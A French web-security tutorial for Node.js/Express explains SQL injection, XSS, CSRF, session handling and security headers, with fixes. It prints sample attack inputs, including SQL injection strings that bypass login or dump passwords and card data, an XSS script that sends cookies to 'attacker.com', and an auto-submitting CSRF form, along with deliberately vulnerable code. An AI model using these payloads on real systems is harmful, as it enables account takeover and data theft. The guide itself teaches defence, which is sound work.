# 🛡️ Guide de Sécurité - Application Web Node.js/Express

Ce document présente les **vulnérabilités les plus courantes** dans les applications web, leurs conséquences, et les **moyens de s'en protéger** avec des exemples concrets.

---

## 📑 Sommaire

- [🎯 Pourquoi la Sécurité est Critique](#-pourquoi-la-sécurité-est-critique)
- [📊 Le Top 10 OWASP](#-le-top-10-owasp)
- [💉 Injection SQL](#-injection-sql)
- [🎭 Cross-Site Scripting (XSS)](#-cross-site-scripting-xss)
- [🔐 Authentification et Gestion de Session](#-authentification-et-gestion-de-session)
- [🌐 Cross-Site Request Forgery (CSRF)](#-cross-site-request-forgery-csrf)
- [📂 Exposition de Données Sensibles](#-exposition-de-données-sensibles)
- [⚙️ Configuration et Dépendances](#️-configuration-et-dépendances)
- [🚦 Rate Limiting (Limitation de Requêtes)](#-rate-limiting-limitation-de-requêtes)
- [📋 Headers de Sécurité HTTP](#-headers-de-sécurité-http)
- [✅ Checklist de Sécurité Obligatoire](#-checklist-de-sécurité-obligatoire)
- [🔧 Configuration Complète de Sécurité](#-configuration-complète-de-sécurité)

---

## 🎯 Pourquoi la Sécurité est Critique

### 💰 Impact d'une Faille de Sécurité

| Conséquence              | Exemple Réel                              | Coût Potentiel              |
| :----------------------- | :---------------------------------------- | :-------------------------- |
| **Vol de données**       | Identifiants, cartes bancaires            | Amendes RGPD jusqu'à 20M€   |
| **Défacement du site**   | Page remplacée par un message pirate      | Perte de réputation         |
| **Ransomware**           | Fichiers chiffrés, demande de rançon      | Arrêt complet de l'activité |
| **Vol de session**       | Un attaquant se connecte en tant qu'admin | Suppression de données      |
| **Injection de malware** | Redirection vers sites malveillants       | Infection des utilisateurs  |

### 🔢 Statistiques Alarmantes

```text
📊 43% des cyberattaques ciblent les PME
📊 60% des PME font faillite dans les 6 mois après une attaque
📊 95% des failles de sécurité sont dues à une erreur humaine
📊 Le coût moyen d'une violation de données : 4,35M$ (2023)
```

### ⚖️ Obligations Légales (RGPD)

En Europe, vous êtes **légalement obligé** de :

- ✅ Protéger les données personnelles
- ✅ Chiffrer les mots de passe
- ✅ Détecter et signaler les violations sous 72h
- ✅ Permettre aux utilisateurs de supprimer leurs données

**Non-conformité = Amendes jusqu'à 4% du CA mondial** 💸

---

## 📊 Le Top 10 OWASP

L'**OWASP** (Open Web Application Security Project) publie le classement des 10 vulnérabilités les plus critiques :

| Rang | Vulnérabilité                   | Niveau      | Obligatoire   |
| :--- | :------------------------------ | :---------- | :------------ |
| 1    | **Broken Access Control**       | 🔴 Critique | ✅ OUI        |
| 2    | **Cryptographic Failures**      | 🔴 Critique | ✅ OUI        |
| 3    | **Injection (SQL, XSS, etc.)**  | 🔴 Critique | ✅ OUI        |
| 4    | **Insecure Design**             | 🟠 Élevé    | ✅ OUI        |
| 5    | **Security Misconfiguration**   | 🟠 Élevé    | ✅ OUI        |
| 6    | **Vulnerable Components**       | 🟠 Élevé    | ✅ OUI        |
| 7    | **Authentication Failures**     | 🔴 Critique | ✅ OUI        |
| 8    | **Software/Data Integrity**     | 🟡 Moyen    | ⚠️ Recommandé |
| 9    | **Logging/Monitoring Failures** | 🟡 Moyen    | ⚠️ Recommandé |
| 10   | **Server-Side Request Forgery** | 🟡 Moyen    | ⚠️ Recommandé |

---

## 💉 Injection SQL

### 🎯 Qu'est-ce que c'est ?

Une **injection SQL** permet à un attaquant d'exécuter des commandes SQL arbitraires dans votre base de données.

### 💥 Exemple d'Attaque

**Scénario :** Page de connexion

```javascript
// ❌ CODE VULNÉRABLE
app.post("/login", (req, res) => {
  const { email, password } = req.body;

  // Requête construite avec des concaténations
  const query = `
    SELECT * FROM users
    WHERE email = '${email}' AND password = '${password}'
  `;

  db.query(query, (err, results) => {
    if (results.length > 0) {
      res.send("Connecté !");
    } else {
      res.send("Identifiants invalides");
    }
  });
});
```

**L'attaquant envoie :**

```json
{
  "email": "admin@example.com' OR '1'='1' --",
  "password": "nimportequoi"
}
```

**Requête SQL générée :**

```sql
SELECT * FROM users
WHERE email = 'admin@example.com' OR '1'='1' --' AND password = 'nimportequoi'
```

**Résultat :**

- `OR '1'='1'` → Toujours vrai ✅
- `--` → Commente le reste de la requête
- **L'attaquant est connecté en tant qu'admin sans connaître le mot de passe !** 😱

### 🔥 Autres Exemples d'Injections Dangereuses

```sql
-- 🗑️ SUPPRIMER TOUTE LA BASE DE DONNÉES
'; DROP TABLE users; --

-- 🔓 RÉCUPÉRER TOUS LES MOTS DE PASSE
' UNION SELECT id, email, password FROM users --

-- 📊 EXTRAIRE DES DONNÉES SENSIBLES
' UNION SELECT credit_card, cvv, expiry FROM payments --
```

### ✅ Solution : Requêtes Préparées (Parameterized Queries)

Les **requêtes préparées** séparent le code SQL des données utilisateur.

#### **Avec `pg` (PostgreSQL)**

```javascript
// ✅ CODE SÉCURISÉ
app.post("/login", async (req, res) => {
  const { email, password } = req.body;

  try {
    // $1 et $2 sont des placeholders sécurisés
    const query = `
      SELECT * FROM users
      WHERE email = $1 AND password = $2
    `;

    // Les valeurs sont passées séparément
    const result = await pool.query(query, [email, password]);

    if (result.rows.length > 0) {
      res.send("Connecté !");
    } else {
      res.status(401).send("Identifiants invalides");
    }
  } catch (error) {
    console.error("Erreur SQL:", error);
    res.status(500).send("Erreur serveur");
  }
});
```

**Avec l'injection précédente :**

```sql
-- L'attaquant envoie : admin@example.com' OR '1'='1' --
-- PostgreSQL traite TOUT ça comme une chaîne de caractères
SELECT * FROM users
WHERE email = 'admin@example.com'' OR ''1''=''1'' --' AND password = '...'
-- ❌ Aucun utilisateur trouvé, connexion refusée ✅
```

#### **Avec Active Record Pattern**

```javascript
// ✅ CODE SÉCURISÉ avec notre CoreModel
class User extends CoreModel {
  static tableName = "users";

  static async findByEmail(email) {
    const query = `SELECT * FROM ${this.tableName} WHERE email = $1`;
    const result = await pool.query(query, [email]);
    return result.rows[0] ? new this(result.rows[0]) : null;
  }
}

// Utilisation
app.post("/login", async (req, res) => {
  const { email, password } = req.body;

  const user = await User.findByEmail(email); // Sécurisé ✅

  if (user && (await bcrypt.compare(password, user.password))) {
    res.send("Connecté !");
  } else {
    res.status(401).send("Identifiants invalides");
  }
});
```

### 📋 Règles pour Éviter les Injections SQL

| ❌ À NE JAMAIS FAIRE                    | ✅ À TOUJOURS FAIRE                 |
| :-------------------------------------- | :---------------------------------- |
| Concaténation de strings                | Requêtes préparées avec `$1, $2...` |
| Template literals `` `...${var}` ``     | Passage des valeurs dans un tableau |
| Construire des requêtes dynamiquement   | Utiliser un ORM (Sequelize, Prisma) |
| Faire confiance aux données utilisateur | Valider et assainir les entrées     |

---

## 🎭 Cross-Site Scripting (XSS)

### 🎯 Qu'est-ce que c'est ?

Le **XSS** permet à un attaquant d'injecter du JavaScript malveillant qui s'exécute dans le navigateur des autres utilisateurs.

### 💥 Exemple d'Attaque

**Scénario :** Commentaires sur un article

```javascript
// ❌ CODE VULNÉRABLE
app.post("/comments", async (req, res) => {
  const { content } = req.body;

  // Enregistrement sans validation
  await Comment.create({ content });

  res.redirect("/article");
});
```

**Vue EJS vulnérable :**

```ejs
<!-- ❌ DANGEREUX : Affichage sans échappement -->
<div class="comments">
  <% comments.forEach(comment => { %>
    <div class="comment">
      <%- comment.content %>
    </div>
  <% }) %>
</div>
```

**L'attaquant poste :**

```html
<script>
  // Vol de cookies (tokens de session)
  fetch("https://attacker.com/steal?cookie=" + document.cookie);
</script>

<img src="x" onerror="alert('XSS!')" />

<iframe src="https://malware.com"></iframe>
```

**Résultat :**

- ✅ Le script s'exécute dans le navigateur de TOUS les visiteurs
- 😱 Vol des cookies de session → Usurpation d'identité
- 😱 Redirection vers des sites malveillants
- 😱 Keylogger pour capturer les frappes clavier

### 🔥 Types de XSS

| Type              | Description                                  | Exemple                               |
| :---------------- | :------------------------------------------- | :------------------------------------ |
| **Stored XSS**    | Stocké en BDD, affecte tous les utilisateurs | Commentaire malveillant               |
| **Reflected XSS** | Via URL, affecte la victime qui clique       | `?search=<script>...</script>`        |
| **DOM-based XSS** | Manipulation du DOM côté client              | `innerHTML` avec données non validées |

### ✅ Solution 1 : Échappement Automatique (EJS)

```ejs
<!-- ✅ SÉCURISÉ : <%= échappe automatiquement -->
<div class="comments">
  <% comments.forEach(comment => { %>
    <div class="comment">
      <%= comment.content %>
    </div>
  <% }) %>
</div>
```

**Transformation automatique :**

```html
<!-- L'attaquant envoie : -->
<script>
  alert("XSS");
</script>

<!-- EJS transforme en : -->
&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;

<!-- Le navigateur affiche le TEXTE, n'exécute PAS le script ✅ -->
```

### ✅ Solution 2 : Sanitization HTML (Autoriser certaines balises)

Si vous voulez autoriser **du HTML sûr** (gras, italique) :

```bash
npm install dompurify jsdom
```

**Fichier : `utils/sanitize.js`**

```javascript
import createDOMPurify from "dompurify";
import { JSDOM } from "jsdom";

const window = new JSDOM("").window;
const DOMPurify = createDOMPurify(window);

/**
 * Nettoie le HTML en autorisant uniquement des balises sûres
 * @param {string} dirty - HTML potentiellement dangereux
 * @returns {string} - HTML nettoyé
 */
export function sanitizeHTML(dirty) {
  return DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: ["b", "i", "em", "strong", "p", "br", "ul", "ol", "li"],
    ALLOWED_ATTR: [], // Aucun attribut autorisé
  });
}
```

**Dans le contrôleur :**

```javascript
import { sanitizeHTML } from "../utils/sanitize.js";

app.post("/comments", async (req, res) => {
  const { content } = req.body;

  // Nettoyer le contenu
  const safeContent = sanitizeHTML(content);

  await Comment.create({ content: safeContent });

  res.redirect("/article");
});
```

**Dans la vue :**

```ejs
<!-- Maintenant c'est sûr d'utiliser <%- %> -->
<div class="comment">
  <%- comment.content %>
</div>
```

**Résultat :**

```html
<!-- L'attaquant envoie : -->
Ceci est <b>important</b>
<script>
  alert("XSS");
</script>

<!-- Après sanitization : -->
Ceci est <b>important</b>
<!-- Le <script> a été supprimé ✅ -->
```

### ✅ Solution 3 : Content Security Policy (CSP)

Le **CSP** bloque l'exécution de scripts non autorisés.

```javascript
import helmet from "helmet";

app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"], // Autoriser uniquement le domaine actuel
      scriptSrc: ["'self'"], // Pas de scripts externes
      styleSrc: ["'self'", "'unsafe-inline'"], // CSS inline autorisé
      imgSrc: ["'self'", "data:", "https:"], // Images du domaine ou HTTPS
      connectSrc: ["'self'"], // Requêtes AJAX limitées au domaine
      fontSrc: ["'self'"],
      objectSrc: ["'none'"], // Bloquer <object>, <embed>
      upgradeInsecureRequests: [], // Forcer HTTPS
    },
  }),
);
```

**Résultat :**

- ❌ `<script src="https://attacker.com/evil.js">` → Bloqué
- ❌ `<script>alert('XSS')</script>` → Bloqué (inline non autorisé)
- ✅ `<script src="/js/main.js">` → Autorisé (même domaine)

### 📋 Règles pour Éviter XSS

| ❌ À NE JAMAIS FAIRE                 | ✅ À TOUJOURS FAIRE                |
| :----------------------------------- | :--------------------------------- |
| `<%- userContent %>` dans EJS        | `<%= userContent %>` (échappement) |
| `innerHTML` avec données utilisateur | `textContent` ou `innerText`       |
| `eval()` avec données utilisateur    | Ne JAMAIS utiliser `eval()`        |
| Autoriser tous les tags HTML         | Utiliser DOMPurify avec whitelist  |
| Pas de validation côté serveur       | Valider ET sanitizer               |

---

## 🔐 Authentification et Gestion de Session

### 🎯 Stockage des Mots de Passe

#### ❌ Ce qu'il NE FAUT JAMAIS FAIRE

```javascript
// ❌ CATASTROPHIQUE : Stockage en clair
await User.create({
  email,
  password: password, // "monpassword123"
});

// ❌ TRÈS MAUVAIS : MD5 ou SHA1 (cassables en secondes)
const hash = crypto.createHash("md5").update(password).digest("hex");

// ❌ MAUVAIS : SHA256 sans salt (tables arc-en-ciel)
const hash = crypto.createHash("sha256").update(password).digest("hex");
```

#### ✅ Solution : bcrypt avec Salt

```bash
npm install bcrypt
```

**Hachage du mot de passe :**

```javascript
import bcrypt from "bcrypt";

/**
 * Hache un mot de passe de manière sécurisée
 * @param {string} password - Mot de passe en clair
 * @returns {Promise<string>} - Hash bcrypt
 */
async function hashPassword(password) {
  const saltRounds = 10; // Coût computationnel (2^10 itérations)
  return await bcrypt.hash(password, saltRounds);
}

// Inscription
app.post("/register", async (req, res) => {
  const { email, password } = req.body;

  // ✅ Validation
  if (password.length < 8) {
    return res.status(400).send("Mot de passe trop court");
  }

  try {
    // ✅ Hachage
    const hashedPassword = await hashPassword(password);

    // ✅ Stockage du hash (jamais le mot de passe en clair)
    await User.create({
      email,
      password: hashedPassword, // $2b$10$abcdef...
    });

    res.send("Compte créé !");
  } catch (error) {
    console.error("Erreur inscription:", error);
    res.status(500).send("Erreur serveur");
  }
});
```

**Vérification du mot de passe :**

```javascript
/**
 * Vérifie un mot de passe contre un hash bcrypt
 * @param {string} password - Mot de passe en clair
 * @param {string} hash - Hash stocké en BDD
 * @returns {Promise<boolean>}
 */
async function verifyPassword(password, hash) {
  return await bcrypt.compare(password, hash);
}

// Connexion
app.post("/login", async (req, res) => {
  const { email, password } = req.body;

  try {
    const user = await User.findByEmail(email);

    if (!user) {
      return res.status(401).send("Identifiants invalides");
    }

    // ✅ Vérification sécurisée
    const isValid = await verifyPassword(password, user.password);

    if (!isValid) {
      return res.status(401).send("Identifiants invalides");
    }

    // Connexion réussie
    req.session.userId = user.id;
    res.send("Connecté !");
  } catch (error) {
    console.error("Erreur connexion:", error);
    res.status(500).send("Erreur serveur");
  }
});
```

### 🎯 Gestion des Sessions

#### ❌ Sessions Vulnérables

```javascript
// ❌ Secret faible
app.use(
  session({
    secret: "123456", // Cassable en quelques secondes
  }),
);

// ❌ Cookie non sécurisé
app.use(
  session({
    secret: process.env.SESSION_SECRET,
    cookie: {
      httpOnly: false, // ❌ Accessible via JavaScript
      secure: false, // ❌ Peut être intercepté en HTTP
      sameSite: "none", // ❌ Vulnérable au CSRF
    },
  }),
);
```

#### ✅ Configuration Sécurisée

```bash
npm install express-session connect-pg-simple
```

**Fichier : `app.js`**

```javascript
import session from "express-session";
import pgSession from "connect-pg-simple";
import pool from "./config/database.js";

const PgStore = pgSession(session);

app.use(
  session({
    // ✅ Secret fort et aléatoire (généré avec crypto.randomBytes(64).toString('hex'))
    secret: process.env.SESSION_SECRET,

    // ✅ Stockage en base de données PostgreSQL
    store: new PgStore({
      pool: pool,
      tableName: "session", // Table créée automatiquement
      createTableIfMissing: true,
    }),

    // ✅ Cookies sécurisés
    cookie: {
      maxAge: 1000 * 60 * 60 * 24, // 24 heures
      httpOnly: true, // ✅ Inaccessible via JavaScript (protection XSS)
      secure: process.env.NODE_ENV === "production", // ✅ HTTPS uniquement en prod
      sameSite: "strict", // ✅ Protection CSRF
    },

    // ✅ Régénérer l'ID de session après connexion
    resave: false,
    saveUninitialized: false,
  }),
);
```

**Générer un secret fort :**

```bash
# Dans le terminal
node -e "console.log(require('crypto').randomBytes(64).toString('hex'))"
```

Copier le résultat dans `.env` :

```env
SESSION_SECRET=a1b2c3d4e5f6...votre_secret_ici...
```

### 🎯 Protection des Routes

**Middleware d'authentification :**

```javascript
/**
 * Vérifie si l'utilisateur est connecté
 */
function requireAuth(req, res, next) {
  if (!req.session.userId) {
    return res.status(401).redirect("/login");
  }
  next();
}

/**
 * Vérifie si l'utilisateur est administrateur
 */
async function requireAdmin(req, res, next) {
  if (!req.session.userId) {
    return res.status(401).redirect("/login");
  }

  const user = await User.findById(req.session.userId);

  if (!user || user.role !== "admin") {
    return res.status(403).send("Accès interdit");
  }

  req.user = user; // Disponible dans les routes suivantes
  next();
}

// Utilisation
app.get("/dashboard", requireAuth, (req, res) => {
  res.render("dashboard");
});

app.get("/admin", requireAdmin, (req, res) => {
  res.render("admin", { user: req.user });
});
```

### 📋 Règles d'Authentification

| Règle                        | Pourquoi                              | Comment                      |
| :--------------------------- | :------------------------------------ | :--------------------------- |
| **Hacher les mots de passe** | Éviter le vol en cas de fuite         | bcrypt avec salt             |
| **Secret fort**              | Empêcher la falsification de sessions | `crypto.randomBytes(64)`     |
| **HTTPS obligatoire**        | Chiffrer les données en transit       | `cookie.secure = true`       |
| **httpOnly**                 | Protéger contre XSS                   | `cookie.httpOnly = true`     |
| **sameSite**                 | Protéger contre CSRF                  | `cookie.sameSite = 'strict'` |
| **Expiration courte**        | Limiter la fenêtre d'attaque          | `maxAge: 24h`                |
| **Régénérer l'ID**           | Éviter la fixation de session         | Après connexion/déconnexion  |

---

## 🌐 Cross-Site Request Forgery (CSRF)

### 🎯 Qu'est-ce que c'est ?

Le **CSRF** force un utilisateur authentifié à exécuter une action non désirée.

### 💥 Exemple d'Attaque

**Scénario :** Utilisateur connecté sur `votresite.com`

```html
<!-- Site malveillant : attacker.com -->
<h1>Gagnez un iPhone gratuit !</h1>

<!-- Formulaire caché qui supprime le compte -->
<form action="https://votresite.com/delete-account" method="POST" id="evil">
  <input type="hidden" name="confirm" value="true" />
</form>

<script>
  // Soumission automatique au chargement de la page
  document.getElementById("evil").submit();
</script>
```

**Si l'utilisateur visite `attacker.com` :**

1. Le formulaire est soumis automatiquement
2. Le navigateur envoie les cookies de session de `votresite.com`
3. ✅ La requête est authentifiée
4. 😱 Le compte est supprimé !

### ✅ Solution : Token CSRF

```bash
npm install csurf
```

**Configuration :**

```javascript
import csrf from "csurf";

// ✅ Protection CSRF (après express-session)
const csrfProtection = csrf({ cookie: false }); // Utilise la session

// Appliquer à toutes les routes POST/PUT/DELETE
app.use(csrfProtection);

// Middleware pour passer le token aux vues
app.use((req, res, next) => {
  res.locals.csrfToken = req.csrfToken();
  next();
});
```

**Dans les formulaires :**

```ejs
<form action="/delete-account" method="POST">
  <!-- ✅ Token CSRF obligatoire -->
  <input type="hidden" name="_csrf" value="<%= csrfToken %>">

  <button type="submit">Supprimer mon compte</button>
</form>
```

**Avec AJAX :**

```javascript
// Récupérer le token depuis un meta tag
// Dans le layout :
<meta name="csrf-token" content="<%= csrfToken %>">

// Dans le JS :
const token = document.querySelector('meta[name="csrf-token"]').content;

fetch('/delete-account', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'CSRF-Token': token // ✅ Envoyer le token
  },
  body: JSON.stringify({ confirm: true })
});
```

**Résultat :**

- ❌ Requête depuis `attacker.com` → **Pas de token valide → Rejetée**
- ✅ Requête depuis `votresite.com` → **Token valide → Acceptée**

### 📋 Règles CSRF

| Protection                  | Description                                       |
| :-------------------------- | :------------------------------------------------ |
| **Token CSRF**              | Unique par session, validé côté serveur           |
| **SameSite Cookie**         | `sameSite: 'strict'` empêche l'envoi cross-origin |
| **Vérifier l'Origin**       | Rejeter si `req.headers.origin` est suspect       |
| **Pas de GET pour actions** | GET /delete ❌ → POST /delete ✅                  |

---

## 📂 Exposition de Données Sensibles

### 🎯 Fichiers à Protéger

#### ❌ Erreurs Courantes

```javascript
// ❌ .env committé sur GitHub
// .env
DATABASE_URL=postgres://user:password@localhost/db
SESSION_SECRET=supersecret123
```

```bash
# ❌ .gitignore absent ou incomplet
```

#### ✅ Solution : .gitignore Complet

**Fichier : `.gitignore`**

```gitignore
# ✅ Fichiers de configuration sensibles
.env
.env.local
.env.production

# ✅ Dépendances
node_modules/

# ✅ Logs
logs/
*.log
npm-debug.log*

# ✅ Base de données locale
*.sqlite
*.db

# ✅ Fichiers de build
dist/
build/

# ✅ Fichiers système
.DS_Store
Thumbs.db

# ✅ IDE
.vscode/
.idea/
*.swp
```

### 🎯 Messages d'Erreur

#### ❌ Trop Verbeux (Exposition d'Info)

```javascript
// ❌ DANGEREUX en production
app.get("/items/:id", async (req, res) => {
  try {
    const item = await Item.findById(req.params.id);
    res.json(item);
  } catch (error) {
    // ❌ Expose la structure de la BDD et les chemins serveur
    res.status(500).send(`Erreur : ${error.message}`);
  }
});
```

**Message d'erreur exposé :**

```text
Error: column "users.password_hash" does not exist
    at /home/user/app/models/Item.js:42:18
    at Query.handleError (/home/user/app/node_modules/pg/lib/query.js:144:5)
```

**Ce que l'attaquant apprend :**

- 📊 Structure de la base de données (`users.password_hash`)
- 📂 Chemin des fichiers (`/home/user/app/models/Item.js`)
- 🔧 Technologies utilisées (PostgreSQL, node-postgres)

#### ✅ Messages Génériques

```javascript
// ✅ BON : Messages génériques en production
app.get("/items/:id", async (req, res) => {
  try {
    const item = await Item.findById(req.params.id);

    if (!item) {
      return res.status(404).json({ error: "Ressource non trouvée" });
    }

    res.json(item);
  } catch (error) {
    // ✅ Logger l'erreur complète côté serveur
    console.error("Erreur GET /items/:id:", error);

    // ✅ Message générique pour le client
    res.status(500).json({
      error: "Une erreur est survenue",
    });
  }
});
```

**En développement :**

```javascript
// Fichier : app.js
if (process.env.NODE_ENV === "development") {
  // Afficher les erreurs détaillées en dev
  app.use((error, req, res, next) => {
    res.status(500).json({
      error: error.message,
      stack: error.stack,
    });
  });
} else {
  // Messages génériques en production
  app.use((error, req, res, next) => {
    console.error("Erreur serveur:", error);
    res.status(500).json({ error: "Erreur serveur" });
  });
}
```

### 🎯 Sérialisation des Objets

#### ❌ Exposer Toutes les Propriétés

```javascript
// ❌ DANGEREUX : Le mot de passe est exposé
app.get("/users/:id", async (req, res) => {
  const user = await User.findById(req.params.id);
  res.json(user); // { id, email, password, role, ... }
});
```

#### ✅ Méthode de Sérialisation

```javascript
// ✅ Modèle avec méthode toJSON
class User extends CoreModel {
  /**
   * Sérialise l'utilisateur en JSON sécurisé
   * @returns {Object} - Données publiques uniquement
   */
  toJSON() {
    return {
      id: this.id,
      email: this.email,
      firstName: this.firstName,
      lastName: this.lastName,
      createdAt: this.createdAt,
      // ❌ password n'est PAS inclus
      // ❌ role n'est PAS inclus (sauf si admin)
    };
  }
}

// Utilisation
app.get("/users/:id", async (req, res) => {
  const user = await User.findById(req.params.id);
  res.json(user.toJSON()); // ✅ Seulement les données publiques
});
```

### 📋 Règles de Protection des Données

| Règle                       | Pourquoi                            | Comment                      |
| :-------------------------- | :---------------------------------- | :--------------------------- |
| **Jamais de .env dans Git** | Éviter le vol de credentials        | `.gitignore`                 |
| **Messages génériques**     | Ne pas exposer la structure interne | Logs côté serveur uniquement |
| **Sérialisation**           | Ne pas envoyer de données sensibles | Méthode `toJSON()`           |
| **HTTPS obligatoire**       | Chiffrer les données en transit     | Certificat SSL/TLS           |
| **Logs sécurisés**          | Ne pas logger de mots de passe      | Sanitization avant log       |

---

## ⚙️ Configuration et Dépendances

### 🎯 Dépendances Vulnérables

#### ❌ Packages Obsolètes

```bash
# ❌ Versions anciennes avec failles connues
npm install express@3.0.0 # Vulnérable à plusieurs CVE
```

#### ✅ Audit et Mise à Jour

```bash
# ✅ Auditer les dépendances
npm audit

# ✅ Corriger automatiquement les vulnérabilités
npm audit fix

# ✅ Forcer les corrections majeures
npm audit fix --force

# ✅ Vérifier les packages obsolètes
npm outdated

# ✅ Mettre à jour
npm update
```

**Automatiser avec GitHub Dependabot :**

**Fichier : `.github/dependabot.yml`**

```yaml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
```

### 🎯 Variables d'Environnement

#### ❌ Valeurs en Dur

```javascript
// ❌ CATASTROPHIQUE
const db = new Pool({
  host: "localhost",
  user: "admin",
  password: "admin123", // ❌ Mot de passe en clair dans le code
  database: "myapp",
});
```

#### ✅ Fichier .env

**Fichier : `.env`**

```env
# Base de données
DATABASE_URL=postgres://user:password@localhost:5432/myapp

# Session
SESSION_SECRET=votre_secret_fort_genere_avec_crypto

# Environnement
NODE_ENV=development

# API externes
STRIPE_SECRET_KEY=sk_test_...
SENDGRID_API_KEY=SG....
```

**Fichier : `config/database.js`**

```javascript
import pg from "pg";
import "dotenv/config"; // ✅ Charge automatiquement .env

const { Pool } = pg;

// ✅ Vérification de la présence
if (!process.env.DATABASE_URL) {
  throw new Error("DATABASE_URL manquant dans .env");
}

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl:
    process.env.NODE_ENV === "production"
      ? { rejectUnauthorized: false }
      : false,
});

export default pool;
```

### 🎯 Headers de Sécurité

#### ✅ Configuration avec Helmet

```bash
npm install helmet
```

**Fichier : `app.js`**

```javascript
import helmet from "helmet";

// ✅ Protection générale (applique plusieurs headers)
app.use(helmet());

// ✅ Configuration personnalisée
app.use(
  helmet({
    // Content Security Policy (bloque les scripts non autorisés)
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'", "'unsafe-inline'"], // Temporaire pour le dev
        styleSrc: ["'self'", "'unsafe-inline'"],
        imgSrc: ["'self'", "data:", "https:"],
      },
    },

    // Force HTTPS
    hsts: {
      maxAge: 31536000, // 1 an
      includeSubDomains: true,
      preload: true,
    },

    // Empêche le navigateur de détecter le type MIME
    noSniff: true,

    // Bloque l'intégration dans une <iframe> (clickjacking)
    frameguard: { action: "deny" },

    // Désactive la mise en cache DNS
    dnsPrefetchControl: { allow: false },

    // Désactive le téléchargement automatique
    ieNoOpen: true,

    // Force le mode moderne des navigateurs
    xssFilter: true,
  }),
);
```

**Headers ajoutés automatiquement :**

```text
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Content-Security-Policy: default-src 'self'; ...
```

---

## 🚦 Rate Limiting (Limitation de Requêtes)

### 🎯 Qu'est-ce que c'est ?

Le **rate limiting** limite le nombre de requêtes qu'un utilisateur peut faire dans un temps donné.

### 💥 Attaques Prévenues

| Attaque         | Description                       | Impact          |
| :-------------- | :-------------------------------- | :-------------- |
| **Brute Force** | Tester 1000 mots de passe/seconde | Vol de comptes  |
| **DDoS**        | Saturer le serveur de requêtes    | Indisponibilité |
| **Scraping**    | Extraire toute la base de données | Vol de données  |
| **Spam**        | Poster 1000 commentaires/minute   | Pollution       |

### ✅ Solution : express-rate-limit

```bash
npm install express-rate-limit
```

**Configuration :**

```javascript
import rateLimit from "express-rate-limit";

// ✅ Limiter les tentatives de connexion
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // Max 5 tentatives
  message: "Trop de tentatives de connexion. Réessayez dans 15 minutes.",
  standardHeaders: true, // Retourner les infos dans les headers
  legacyHeaders: false,
});

app.post("/login", loginLimiter, async (req, res) => {
  // Logique de connexion
});

// ✅ Limiter les créations de compte
const registerLimiter = rateLimit({
  windowMs: 60 * 60 * 1000, // 1 heure
  max: 3, // Max 3 comptes par heure par IP
  message: "Trop de comptes créés depuis cette adresse IP.",
});

app.post("/register", registerLimiter, async (req, res) => {
  // Logique d'inscription
});

// ✅ Limiter toutes les routes API
const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // Max 100 requêtes par fenêtre
});

app.use("/api/", apiLimiter);

// ✅ Limiter les routes publiques (moins strict)
const generalLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 500, // Plus permissif
});

app.use(generalLimiter);
```

**Réponse quand la limite est atteinte :**

```json
{
  "error": "Trop de tentatives de connexion. Réessayez dans 15 minutes."
}
```

**Headers de réponse :**

```text
RateLimit-Limit: 5
RateLimit-Remaining: 0
RateLimit-Reset: 1674389400
```

---

## 📋 Headers de Sécurité HTTP

### 🎯 Headers Essentiels

| Header                        | Rôle                               | Valeur Recommandée                    |
| :---------------------------- | :--------------------------------- | :------------------------------------ |
| **Strict-Transport-Security** | Force HTTPS                        | `max-age=31536000; includeSubDomains` |
| **X-Content-Type-Options**    | Empêche le sniffing MIME           | `nosniff`                             |
| **X-Frame-Options**           | Bloque les iframes (clickjacking)  | `DENY` ou `SAMEORIGIN`                |
| **X-XSS-Protection**          | Active le filtre XSS du navigateur | `1; mode=block`                       |
| **Content-Security-Policy**   | Contrôle les sources autorisées    | `default-src 'self'`                  |
| **Referrer-Policy**           | Contrôle les infos du referer      | `no-referrer-when-downgrade`          |
| **Permissions-Policy**        | Contrôle les APIs du navigateur    | `geolocation=(), microphone=()`       |

### ✅ Configuration Complète

```javascript
app.use(
  helmet({
    // Force HTTPS pendant 1 an
    hsts: {
      maxAge: 31536000,
      includeSubDomains: true,
      preload: true,
    },

    // Bloque les iframes (protection clickjacking)
    frameguard: {
      action: "deny", // ou 'sameorigin' si besoin d'embed
    },

    // Empêche le sniffing MIME
    noSniff: true,

    // Active le filtre XSS du navigateur
    xssFilter: true,

    // Content Security Policy
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'", "https://cdn.jsdelivr.net"],
        styleSrc: ["'self'", "'unsafe-inline'"],
        imgSrc: ["'self'", "data:", "https:"],
        connectSrc: ["'self'"],
        fontSrc: ["'self'"],
        objectSrc: ["'none'"],
        mediaSrc: ["'self'"],
        frameSrc: ["'none'"],
      },
    },

    // Contrôle le referer
    referrerPolicy: {
      policy: "no-referrer-when-downgrade",
    },
  }),
);
```

---

## ✅ Checklist de Sécurité Obligatoire

### 🔴 Niveau Critique (OBLIGATOIRE)

- [ ] **Requêtes préparées** pour toutes les requêtes SQL
- [ ] **Échappement automatique** (`<%= %>`) pour toutes les données utilisateur
- [ ] **Hachage bcrypt** des mots de passe (jamais en clair)
- [ ] **Secret fort** pour les sessions (`crypto.randomBytes(64)`)
- [ ] **HTTPS** en production (`cookie.secure = true`)
- [ ] **httpOnly** pour les cookies de session
- [ ] **sameSite** strict pour les cookies
- [ ] **Validation** des données utilisateur (backend)
- [ ] **Messages d'erreur génériques** en production
- [ ] **.env** dans `.gitignore` (jamais committé)
- [ ] **Helmet** configuré pour les headers de sécurité
- [ ] **Rate limiting** sur les routes sensibles (login, register)
- [ ] **CSRF protection** pour les formulaires POST/PUT/DELETE
- [ ] **npm audit** régulier des dépendances

### 🟠 Niveau Élevé (Fortement Recommandé)

